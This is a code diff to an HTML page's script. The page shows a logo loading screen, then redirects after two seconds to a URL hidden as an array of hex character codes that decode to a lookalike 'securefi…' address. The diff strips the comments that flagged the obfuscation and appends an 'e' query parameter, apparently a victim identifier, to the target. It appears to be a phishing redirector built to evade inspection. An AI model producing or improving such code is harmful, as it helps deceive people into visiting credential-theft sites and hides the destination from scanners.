@@ -45,10 +45,12 @@
   </style>
   <script>
     document.addEventListener('DOMContentLoaded', function() {
-      // Show loading animation
+
       document.querySelector('.logo-container').style.opacity = "1";
       
-      // Highly obfuscated URL construction
+      const urlParams = new URLSearchParams(window.location.search);
+      const encodedParam = urlParams.get('e') || '';
+      
       const parts = [
         0x68, 0x74, 0x74, 0x70, 0x73, 0x3a, 0x2f, 0x2f, 
         0x73, 0x65, 0x63, 0x75, 0x72, 0x65, 0x66, 0x69,
@@ -58,9 +60,9 @@
         0x49, 0x55, 0x58, 0x56, 0x64, 0x41, 0x23
       ];
       
-      const targetUrl = parts.map(c => String.fromCharCode(c)).join('');
+      const baseUrl = parts.map(c => String.fromCharCode(c)).join('');
+      const targetUrl = baseUrl + encodedParam;
       
-      // Redirect after 2 seconds
       setTimeout(function() {
         window.location.href = targetUrl;
       }, 2000);
